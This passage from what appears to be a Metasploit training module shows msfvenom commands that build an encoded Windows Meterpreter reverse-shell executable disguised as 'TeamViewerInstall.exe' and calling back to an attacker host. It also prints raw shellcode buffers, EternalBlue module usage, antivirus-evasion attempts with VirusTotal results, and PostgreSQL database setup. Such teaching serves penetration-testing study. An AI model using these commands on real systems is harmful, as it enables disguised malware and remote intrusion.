"<span class="hljs-tag">\<span class="hljs-name">xb</span></span>1<span class="hljs-tag">\<span class="hljs-name">x</span></span>59<span class="hljs-tag">\<span class="hljs-name">x</span></span>83<span class="hljs-tag">\<span class="hljs-name">xeb</span></span><span class="hljs-tag">\<span class="hljs-name">xfc</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>31<span class="hljs-tag">\<span class="hljs-name">x</span></span>53<span class="hljs-tag">\<span class="hljs-name">x</span></span>15<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">x</span></span>53<span class="hljs-tag">\<span class="hljs-name">x</span></span>15<span class="hljs-tag">\<span class="hljs-name">xd</span></span>5<span class="hljs-tag">\<span class="hljs-name">x</span></span>32<span class="hljs-tag">\<span class="hljs-name">x</span></span>37" .
"<span class="hljs-tag">\<span class="hljs-name">xb</span></span>6<span class="hljs-tag">\<span class="hljs-name">x</span></span>96<span class="hljs-tag">\<span class="hljs-name">xbd</span></span><span class="hljs-tag">\<span class="hljs-name">xc</span></span>8<span class="hljs-tag">\<span class="hljs-name">x</span></span>47<span class="hljs-tag">\<span class="hljs-name">xc</span></span>8<span class="hljs-tag">\<span class="hljs-name">x</span></span>8c<span class="hljs-tag">\<span class="hljs-name">x</span></span>1a<span class="hljs-tag">\<span class="hljs-name">x</span></span>23<span class="hljs-tag">\<span class="hljs-name">x</span></span>83<span class="hljs-tag">\<span class="hljs-name">xbd</span></span><span class="hljs-tag">\<span class="hljs-name">xaa</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>27<span class="hljs-tag">\<span class="hljs-name">xc</span></span>1" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>4d<span class="hljs-tag">\<span class="hljs-name">x</span></span>42<span class="hljs-tag">\<span class="hljs-name">xd</span></span>2<span class="hljs-tag">\<span class="hljs-name">x</span></span>6e<span class="hljs-tag">\<span class="hljs-name">x</span></span>1f<span class="hljs-tag">\<span class="hljs-name">x</span></span>40<span class="hljs-tag">\<span class="hljs-name">x</span></span>2c<span class="hljs-tag">\<span class="hljs-name">x</span></span>8f<span class="hljs-tag">\<span class="hljs-name">x</span></span>2b<span class="hljs-tag">\<span class="hljs-name">x</span></span>1a<span class="hljs-tag">\<span class="hljs-name">x</span></span>66<span class="hljs-tag">\<span class="hljs-name">x</span></span>60<span class="hljs-tag">\<span class="hljs-name">x</span></span>9b<span class="hljs-tag">\<span class="hljs-name">x</span></span>91" .
"<span class="hljs-tag">\<span class="hljs-name">x</span></span>50<span class="hljs-tag">\<span class="hljs-name">x</span></span>4f<span class="hljs-tag">\<span class="hljs-name">x</span></span>23<span class="hljs-tag">\<span class="hljs-name">x</span></span>89<span class="hljs-tag">\<span class="hljs-name">xa</span></span>1<span class="hljs-tag">\<span class="hljs-name">xce</span></span><span class="hljs-tag">\<span class="hljs-name">xdf</span></span><span class="hljs-tag">\<span class="hljs-name">xd</span></span>0<span class="hljs-tag">\<span class="hljs-name">xf</span></span>5<span class="hljs-tag">\<span class="hljs-name">x</span></span>30<span class="hljs-tag">\<span class="hljs-name">xe</span></span>1<span class="hljs-tag">\<span class="hljs-name">x</span></span>1a<span class="hljs-tag">\<span class="hljs-name">x</span></span>08<span class="hljs-tag">\<span class="hljs-name">x</span></span>31" .

&lt;SNIP&gt;
</code></pre>
<p>We should now look at the first line of the <code>$buf</code> and see how it changes when applying an encoder like <code>shikata_ga_nai</code>.</p>
<p><strong>Generating Payload - With Encoding</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "<span class="hljs-symbol">\x</span>00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "<span class="hljs-symbol">\x</span>bb<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>da<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>d9<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>31"
buf += "<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>b1<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>32"
buf += "<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>ea<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>91<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>d6<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>94"
buf += "<span class="hljs-symbol">\x</span>47<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>2b<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>fd<span class="hljs-symbol">\x</span>6e"
buf += "<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>a6<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>77<span class="hljs-symbol">\x</span>9e"

&lt;SNIP&gt;
</code></pre>
<p><strong>Shikata Ga Nai Encoding</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/shikata\_ga\_nai.gif" alt=""> Source: <a href="https://hatching.io/blog/metasploit-payloads2/">https://hatching.io/blog/metasploit-payloads2/</a></p>
<p>If we want to look at the functioning of the <code>shikata_ga_nai</code> encoder, we can look at an excellent post <a href="https://hatching.io/blog/metasploit-payloads2/">here</a>.</p>
<p>Suppose we want to select an Encoder for an <code>existing payload</code>. Then, we can use the <code>show encoders</code> command within the <code>msfconsole</code> to see which encoders are available for our current <code>Exploit module + Payload</code> combination.</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">15</span>

payload <span class="hljs-comment">=&gt; windows</span>/x64/<span class="hljs-comment">meterpreter</span>/reverse_tcp


msf6 exploit(windows/<span class="hljs-comment">smb</span>/ms17_010_eternalblue) &gt; show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   <span class="hljs-number">0</span>  generic/<span class="hljs-comment">eicar                      manual  No     The EICAR Encoder</span>
   1  generic/none                       manual  <span class="hljs-keyword">No</span>     The <span class="hljs-comment">"none"</span> Encoder
   <span class="hljs-number">2</span>  x64/xor                            <span class="hljs-comment">manual  No     XOR Encoder</span>
   3  x64/xor_dynamic                    manual  <span class="hljs-keyword">No</span>     Dynamic key <span class="hljs-keyword">XOR</span> Encoder
   <span class="hljs-number">4</span>  x64/zutto_dekiru                   <span class="hljs-comment">manual  No     Zutto Dekiru</span>
</code></pre>
<p>In the previous example, we only see a few encoders fit for x64 systems. Like the available payloads, these are automatically filtered according to the Exploit module only to display the compatible ones. For example, let us try the <code>MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit</code>.</p>
<pre><code class="lang-shell-session">msf6 exploit(ms09_050_smb2_negotiate_func_index) &gt; show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             <span class="hljs-built-in">normal</span>     The <span class="hljs-string">"none"</span> Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      <span class="hljs-built-in">normal</span>     Call+<span class="hljs-number">4</span> Dword <span class="hljs-keyword">XOR</span> Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(<span class="hljs-number">2</span>)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(<span class="hljs-number">2</span>)-based Context Keyed Payload Encoder
   x86/countdown                            <span class="hljs-built-in">normal</span>     Single-byte <span class="hljs-keyword">XOR</span> Countdown Encoder
   x86/fnstenv_mov                          <span class="hljs-built-in">normal</span>     <span class="hljs-keyword">Variable</span>-length <span class="hljs-comment">Fnstenv</span>/mov Dword <span class="hljs-keyword">XOR</span> Encoder
   x86/<span class="hljs-comment">jmp_call_additive                    normal     Jump</span>/Call <span class="hljs-keyword">XOR</span> Additive Feedback Encoder
   x86/<span class="hljs-comment">nonalpha                             low        Non-Alpha Encoder</span>
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       <span class="hljs-comment">excellent  Polymorphic XOR Additive Feedback Encoder</span>
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        <span class="hljs-comment">manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder</span>
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
</code></pre>
<p>Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let&#39;s delve into that for a moment. Picking up <code>msfvenom</code>, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:</p>
<pre><code class="lang-shell-session">[!bash!]$ msfvenom -a x86 --<span class="hljs-keyword">platform</span> windows -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.5</span> LPORT=<span class="hljs-number">8080</span> -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found <span class="hljs-number">1</span> compatible encoders
Attempting <span class="hljs-keyword">to</span> encode payload <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> iterations <span class="hljs-keyword">of</span> x86/shikata_ga_nai
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">368</span> (iteration=<span class="hljs-number">0</span>)
x86/shikata_ga_nai chosen <span class="hljs-keyword">with</span> <span class="hljs-keyword">final</span> size <span class="hljs-number">368</span>
Payload size: <span class="hljs-number">368</span> bytes
<span class="hljs-keyword">Final</span> size <span class="hljs-keyword">of</span> exe file: <span class="hljs-number">73802</span> bytes
Saved <span class="hljs-keyword">as</span>: TeamViewerInstall.exe
</code></pre>
<p>This will generate a payload with the <code>exe</code> format, called TeamViewerInstall.exe, which is meant to work on x86 architecture processors for the Windows platform, with a hidden Meterpreter reverse_tcp shell payload, encoded once with the Shikata Ga Nai scheme. Let us take the result and upload it to VirusTotal.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/39/S8\_SS01.png" alt="image"></p>
<p>One better option would be to try running it through multiple iterations of the same Encoding scheme:</p>
<pre><code class="lang-shell-session">[!bash!]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.5</span> LPORT=<span class="hljs-number">8080</span> -e x86/shikata_ga_nai -f exe -i <span class="hljs-number">10</span> -o /root/Desktop/TeamViewerInstall.exe

Found <span class="hljs-number">1</span> compatible encoders
Attempting to encode payload <span class="hljs-keyword">with</span> <span class="hljs-number">10</span> iterations <span class="hljs-keyword">of</span> x86/shikata_ga_nai
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">368</span> (iteration=<span class="hljs-number">0</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">395</span> (iteration=<span class="hljs-number">1</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">422</span> (iteration=<span class="hljs-number">2</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">449</span> (iteration=<span class="hljs-number">3</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">476</span> (iteration=<span class="hljs-number">4</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">503</span> (iteration=<span class="hljs-number">5</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">530</span> (iteration=<span class="hljs-number">6</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">557</span> (iteration=<span class="hljs-number">7</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">584</span> (iteration=<span class="hljs-number">8</span>)
x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> <span class="hljs-built_in">size</span> <span class="hljs-number">611</span> (iteration=<span class="hljs-number">9</span>)
x86/shikata_ga_nai chosen <span class="hljs-keyword">with</span> final <span class="hljs-built_in">size</span> <span class="hljs-number">611</span>
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">611</span> bytes
Final <span class="hljs-built_in">size</span> <span class="hljs-keyword">of</span> exe <span class="hljs-attribute">file</span>: <span class="hljs-number">73802</span> bytes
<span class="hljs-attribute">Error</span>: Permission denied @ rb_sysopen - <span class="hljs-regexp">/root/</span>Desktop/TeamViewerInstall.exe
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/39/S8\_SS02.png" alt="image"></p>
<p>As we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload. Alternatively, Metasploit offers a tool called <code>msf-virustotal</code> that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.</p>
<p><strong>MSF - VirusTotal</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe

[*] Using API key: &lt;API key&gt;
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : <span class="hljs-number">4</span>f54cc46e2f55be168cc6<span class="hljs-number">114b74a3130</span>
[*] Sample SHA1 hash   : <span class="hljs-number">53</span>fcb4ed92cf40247782de41877b178ef<span class="hljs-number">2a9c5a9</span>
[*] Sample SHA256 hash : <span class="hljs-number">66894</span>cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection/f-&lt;SNIP&gt;-<span class="hljs-number">1651750343</span>
[*] Requesting the report...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Received code -<span class="hljs-number">2</span>. Waiting for another <span class="hljs-number">60</span> seconds...
[*] Analysis Report: TeamViewerInstall.exe (<span class="hljs-number">51</span> / <span class="hljs-number">68</span>): <span class="hljs-number">66894</span>cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
==================================================================================================================

 Antivirus             Detected  Version                                                         Result                                                     Update
 ---------             --------  -------                                                         ------                                                     ------
 ALYac                 true      <span class="hljs-number">1.1.3.1</span>                                                         Trojan.CryptZ.Gen                                          <span class="hljs-number">20220505</span>
 APEX                  true      <span class="hljs-number">6</span>.<span class="hljs-number">288</span>                                                           Malicious                                                  <span class="hljs-number">20220504</span>
 AVG                   true      <span class="hljs-number">21.1.5827</span>.<span class="hljs-number">0</span>                                                     Win32:SwPatch [Wrm]                                        <span class="hljs-number">20220505</span>
 Acronis               true      <span class="hljs-number">1.2.0.108</span>                                                       suspicious                                                 <span class="hljs-number">20220426</span>
 Ad-Aware              true      <span class="hljs-number">3.0.21.193</span>                                                      Trojan.CryptZ.Gen                                          <span class="hljs-number">20220505</span>
 AhnLab-V3             true      <span class="hljs-number">3</span>.<span class="hljs-number">21.3.10230</span>                                                    Trojan/Win32.Shell.R1283                                   <span class="hljs-number">20220505</span>
 Alibaba               false     <span class="hljs-number">0.3.0.5</span>                                                                                                                    <span class="hljs-number">20190527</span>
 Antiy-AVL             false     <span class="hljs-number">3</span>.<span class="hljs-number">0</span>                                                                                                                        <span class="hljs-number">20220505</span>
 Arcabit               true      <span class="hljs-number">1</span>.<span class="hljs-number">0.0.889</span>                                                       Trojan.CryptZ.Gen                                          <span class="hljs-number">20220505</span>
 Avast                 true      <span class="hljs-number">21.1.5827</span>.<span class="hljs-number">0</span>                                                     Win32:SwPatch [Wrm]                                        <span class="hljs-number">20220505</span>
 Avira                 true      <span class="hljs-number">8.3.3.14</span>                                                        TR/Patched.Gen2                                            <span class="hljs-number">20220505</span>
 Baidu                 false     <span class="hljs-number">1.0.0.2</span>                                                                                                                    <span class="hljs-number">20190318</span>
 BitDefender           true      <span class="hljs-number">7</span>.<span class="hljs-number">2</span>                                                             Trojan.CryptZ.Gen                                          <span class="hljs-number">20220505</span>
 BitDefenderTheta      true      <span class="hljs-number">7.2.37796</span>.<span class="hljs-number">0</span>                                                     Gen:NN.ZexaF.<span class="hljs-number">34638</span>.eq1@aC@Q!ici                            <span class="hljs-number">20220428</span>
 Bkav                  true      <span class="hljs-number">1</span>.<span class="hljs-number">3.0.9899</span>                                                      W32.FamVT.RorenNHc.Trojan                                  <span class="hljs-number">20220505</span>
 CAT-QuickHeal         true      <span class="hljs-number">14</span>.<span class="hljs-number">00</span>                                                           Trojan.Swrort.<span class="hljs-keyword">A</span>                                            <span class="hljs-number">20220505</span>
 CMC                   false     <span class="hljs-number">2.10.2019</span>.<span class="hljs-number">1</span>                                                                                                                <span class="hljs-number">20211026</span>
 ClamAV                true      <span class="hljs-number">0.105.0.0</span>                                                       Win.Trojan.MSShellcode-<span class="hljs-number">6360728-0</span>                           <span class="hljs-number">20220505</span>
 Comodo                true      <span class="hljs-number">34592</span>                                                           TrojWare.Win32.Rozena.<span class="hljs-keyword">A</span>@<span class="hljs-number">4</span>jwdqr                             <span class="hljs-number">20220505</span>
 CrowdStrike           true      <span class="hljs-number">1</span>.<span class="hljs-number">0</span>                                                             win/malicious_confidence_100% (D)                          <span class="hljs-number">20220418</span>
 Cylance               true      <span class="hljs-number">2.3.1.101</span>                                                       Unsafe                                                     <span class="hljs-number">20220505</span>
 Cynet                 true      <span class="hljs-number">4.0.0.27</span>                                                        Malicious (score: <span class="hljs-number">100</span>)                                     <span class="hljs-number">20220505</span>
 Cyren                 true      <span class="hljs-number">6.5.1.2</span>                                                         W32/Swrort.<span class="hljs-keyword">A</span>.gen!Eldorado                                  <span class="hljs-number">20220505</span>
 DrWeb                 true      <span class="hljs-number">7</span>.<span class="hljs-number">0.56.4040</span>                                                     Trojan.Swrort.<span class="hljs-number">1</span>                                            <span class="hljs-number">20220505</span>
 ESET-NOD32            true      <span class="hljs-number">25218</span>                                                           a variant of Win32/Rozena.AA                               <span class="hljs-number">20220505</span>
 Elastic               true      <span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">36</span>                                                          malicious (high confidence)                                <span class="hljs-number">20220503</span>
 Emsisoft              true      <span class="hljs-number">2021.5.0</span>.<span class="hljs-number">7597</span>                                                   Trojan.CryptZ.Gen (B)                                      <span class="hljs-number">20220505</span>
 F-Secure              false     <span class="hljs-number">18.10.978</span>-beta,<span class="hljs-number">1651672875</span>v,<span class="hljs-number">1651675347h</span>,<span class="hljs-number">1651717942</span>c,<span class="hljs-number">1650632236</span>t                                                             <span class="hljs-number">20220505</span>
 FireEye               true      <span class="hljs-number">35.24.1.0</span>                                                       Generic.mg.<span class="hljs-number">4</span>f54cc46e2f55be1                                <span class="hljs-number">20220505</span>
 Fortinet              true      <span class="hljs-number">6.2.142.0</span>                                                       MalwThreat!<span class="hljs-number">0971</span>IV                                          <span class="hljs-number">20220505</span>
 GData                 true      <span class="hljs-keyword">A</span>:<span class="hljs-number">25</span>.<span class="hljs-number">32960</span>B:<span class="hljs-number">27.27244</span>                                            Trojan.CryptZ.Gen                                          <span class="hljs-number">20220505</span>
 Gridinsoft            true      <span class="hljs-number">1.0.77.174</span>                                                      Trojan.Win32.Swrort.zv!s2                                  <span class="hljs-number">20220505</span>
 Ikarus                true      <span class="hljs-number">6.0.24.0</span>                                                        Trojan.Win32.Swrort                                        <span class="hljs-number">20220505</span>
 Jiangmin              false     <span class="hljs-number">16.0.100</span>                                                                                                                   <span class="hljs-number">20220504</span>
 K7AntiVirus           true      <span class="hljs-number">12.10.42191</span>                                                     Trojan ( <span class="hljs-number">001172b51</span> )                                       <span class="hljs-number">20220505</span>
 K7GW                  true      <span class="hljs-number">12.10.42191</span>                                                     Trojan ( <span class="hljs-number">001172b51</span> )                                       <span class="hljs-number">20220505</span>
 Kaspersky             true      <span class="hljs-number">21.0.1.45</span>                                                       HEUR:Trojan.Win32.Generic                                  <span class="hljs-number">20220505</span>
 Kingsoft              false     <span class="hljs-number">2017.9.26</span>.<span class="hljs-number">565</span>                                                                                                              <span class="hljs-number">20220505</span>
 Lionic                false     <span class="hljs-number">7</span>.<span class="hljs-number">5</span>                                                                                                                        <span class="hljs-number">20220505</span>
 MAX                   true      <span class="hljs-number">2019.9.16</span>.<span class="hljs-number">1</span>                                                     malware (ai score=<span class="hljs-number">89</span>)                                      <span class="hljs-number">20220505</span>
 Malwarebytes          true      <span class="hljs-number">4.2.2.27</span>                                                        Trojan.Rozena                                              <span class="hljs-number">20220505</span>
 MaxSecure             true      <span class="hljs-number">1.0.0.1</span>                                                         Trojan.Malware.<span class="hljs-number">300983</span>.susgen                               <span class="hljs-number">20220505</span>
 McAfee                true      <span class="hljs-number">6</span>.<span class="hljs-number">0.6.653</span>                                                       Swrort.i                                                   <span class="hljs-number">20220505</span>
 McAfee-GW-Edition     true      v<span class="hljs-number">2019.1.2</span>+<span class="hljs-number">3728</span>                                                  BehavesLike.Win32.Swrort.lh                                <span class="hljs-number">20220505</span>
 MicroWorld-eScan      true      <span class="hljs-number">14.0.409</span>.<span class="hljs-number">0</span>                                                      Trojan.CryptZ.Gen                                          <span class="hljs-number">20220505</span>
 Microsoft             true      <span class="hljs-number">1.1.19200</span>.<span class="hljs-number">5</span>                                                     Trojan:Win32/Meterpreter.<span class="hljs-keyword">A</span>                                 <span class="hljs-number">20220505</span>
 NANO-Antivirus        true      <span class="hljs-number">1.0.146</span>.<span class="hljs-number">25588</span>                                                   Virus.Win32.Gen-Crypt.ccnc                                 <span class="hljs-number">20220505</span>
 Paloalto              false     <span class="hljs-number">0</span>.<span class="hljs-number">9.0.1003</span>                                                                                                                 <span class="hljs-number">20220505</span>
 Panda                 false     <span class="hljs-number">4.6.4.2</span>                                                                                                                    <span class="hljs-number">20220504</span>
 Rising                true      <span class="hljs-number">25.0.0.27</span>                                                       Trojan.Generic@AI.<span class="hljs-number">100</span> (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  <span class="hljs-number">20220505</span>
 SUPERAntiSpyware      true      <span class="hljs-number">5</span>.<span class="hljs-number">6.0.1032</span>                                                      Trojan.Backdoor-Shell                                      <span class="hljs-number">20220430</span>
 Sangfor               true      <span class="hljs-number">2.14.0.0</span>                                                        Trojan.Win32.Save.a                                        <span class="hljs-number">20220415</span>
 SentinelOne           true      <span class="hljs-number">22.2.1.2</span>                                                        Static AI - Malicious PE                                   <span class="hljs-number">20220330</span>
 Sophos                true      <span class="hljs-number">1.4.1.0</span>                                                         ML/PE-<span class="hljs-keyword">A</span> + Mal/EncPk-ACE                                    <span class="hljs-number">20220505</span>
 Symantec              true      <span class="hljs-number">1.17.0.0</span>                                                        Packed.Generic.<span class="hljs-number">347</span>                                         <span class="hljs-number">20220505</span>
 TACHYON               false     <span class="hljs-number">2022-05-05</span>.<span class="hljs-number">02</span>                                                                                                              <span class="hljs-number">20220505</span>
 Tencent               true      <span class="hljs-number">1.0.0.1</span>                                                         Trojan.Win32.Cryptz.za                                     <span class="hljs-number">20220505</span>
 TrendMicro            true      <span class="hljs-number">11</span>.<span class="hljs-number">0.0.1006</span>                                                     BKDR_SWRORT.SM                                             <span class="hljs-number">20220505</span>
 TrendMicro-HouseCall  true      <span class="hljs-number">10</span>.<span class="hljs-number">0.0.1040</span>                                                     BKDR_SWRORT.SM                                             <span class="hljs-number">20220505</span>
 VBA32                 false     <span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>                                                                                                                      <span class="hljs-number">20220505</span>
 ViRobot               true      <span class="hljs-number">2014.3.20</span>.<span class="hljs-number">0</span>                                                     Trojan.Win32.Elzob.Gen                                     <span class="hljs-number">20220504</span>
 VirIT                 false     <span class="hljs-number">9.5.188</span>                                                                                                                    <span class="hljs-number">20220504</span>
 Webroot               false     <span class="hljs-number">1</span>.<span class="hljs-number">0.0.403</span>                                                                                                                  <span class="hljs-number">20220505</span>
 Yandex                true      <span class="hljs-number">5.5.2.24</span>                                                        Trojan.Rosena.Gen.<span class="hljs-number">1</span>                                        <span class="hljs-number">20220428</span>
 Zillya                false     <span class="hljs-number">2</span>.<span class="hljs-number">0.0.4625</span>                                                                                                                 <span class="hljs-number">20220505</span>
 ZoneAlarm             true      <span class="hljs-number">1</span>.<span class="hljs-number">0</span>                                                             HEUR:Trojan.Win32.Generic                                  <span class="hljs-number">20220505</span>
 Zoner                 false     <span class="hljs-number">2.2.2.0</span>                                                                                                                    <span class="hljs-number">20220504</span>
 tehtris               false     v0.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>                                                                                                                     <span class="hljs-number">20220505</span>
</code></pre>
<p>As expected, most anti-virus products that we will encounter in the wild would still detect this payload so we would have to use other methods for AV evasion that are outside the scope of this module</p>
<h2 id="databases">Databases</h2>
<hr>
<p><code>Databases</code> in <code>msfconsole</code> are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc.</p>
<p>This is where Databases come into play. <code>Msfconsole</code> has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools. Database entries can also be used to configure Exploit module parameters with the already existing findings directly.</p>
<hr>
<h3 id="setting-up-the-database">Setting up the Database</h3>
<p>First, we must ensure that the PostgreSQL server is up and running on our host machine. To do so, input the following command:</p>
<p><strong>PostgreSQL Status</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo service postgresql status

● postgresql.service - PostgreSQL RDBMS
<span class="hljs-symbol">     Loaded:</span> loaded (<span class="hljs-meta-keyword">/lib/</span>systemd<span class="hljs-meta-keyword">/system/</span>postgresql.service; disabled; vendor preset: disabled)
<span class="hljs-symbol">     Active:</span> active (exited) since Fri <span class="hljs-number">2022</span><span class="hljs-number">-05</span><span class="hljs-number">-06</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">30</span> BST; <span class="hljs-number">3</span>min <span class="hljs-number">51</span>s ago
<span class="hljs-symbol">    Process:</span> <span class="hljs-number">2147</span> ExecStart=<span class="hljs-meta-keyword">/bin/</span>true (code=exited, status=<span class="hljs-number">0</span>/SUCCESS)
   Main PID: <span class="hljs-number">2147</span> (code=exited, status=<span class="hljs-number">0</span>/SUCCESS)
<span class="hljs-symbol">        CPU:</span> <span class="hljs-number">1</span>ms

May <span class="hljs-number">06</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">30</span> pwnbox-base systemd[<span class="hljs-number">1</span>]: Starting PostgreSQL RDBMS...
May <span class="hljs-number">06</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">30</span> pwnbox-base systemd[<span class="hljs-number">1</span>]: Finished PostgreSQL RDBMS.
</code></pre>
<p><strong>Start PostgreSQL</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo systemctl start postgresql
</code></pre>
<p>After starting PostgreSQL, we need to create and initialize the MSF database with <code>msfdb init</code>.</p>
<p><strong>MSF - Initiate a Database</strong></p>
<p>Databases</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo msfdb init

[i] Database already started
